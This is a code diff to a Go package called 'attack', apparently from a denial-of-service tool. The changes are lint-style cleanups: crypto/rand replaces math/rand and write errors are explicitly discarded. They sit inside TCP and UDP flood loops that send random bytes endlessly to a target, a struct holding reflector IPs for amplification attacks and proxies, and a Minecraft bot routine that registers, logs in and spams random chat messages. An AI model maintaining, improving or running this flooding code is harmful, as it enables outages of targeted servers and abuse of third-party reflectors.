@@ -2,6 +2,7 @@ package attack
 
 import (
 	"context"
+	crand "crypto/rand"
 	"encoding/binary"
 	"math/rand"
 	"net"
@@ -16,7 +17,7 @@ type Layer4 struct {
 	Target     string
 	Port       uint16
 	Method     string
-	Refs       []string   // reflector IPs for AMP methods
+	Refs       []string // reflector IPs for AMP methods
 	Proxies    []proxy.Proxy
 	ProtocolID int
 	LocalIP    net.IP
@@ -79,7 +80,7 @@ func (l *Layer4) tcp() {
 	}
 	defer conn.Close()
 	buf := make([]byte, 1024)
-	rand.Read(buf)
+	_, _ = crand.Read(buf)
 	for {
 		n, err := conn.Write(buf)
 		if err != nil {
@@ -97,7 +98,7 @@ func (l *Layer4) udp() {
 	}
 	defer conn.Close()
 	buf := make([]byte, 1024)
-	rand.Read(buf)
+	_, _ = crand.Read(buf)
 	for {
 		n, err := conn.Write(buf)
 		if err != nil {
@@ -211,9 +212,9 @@ func (l *Layer4) mcbot() {
 	time.Sleep(1500 * time.Millisecond)
 
 	reg := mcChat(l.ProtocolID, "/register pass1234 pass1234")
-	conn.Write(reg)
+	_, _ = conn.Write(reg)
 	lgn := mcChat(l.ProtocolID, "/login pass1234")
-	conn.Write(lgn)
+	_, _ = conn.Write(lgn)
 
 	for {
 		msg := mcChat(l.ProtocolID, randStr(256))
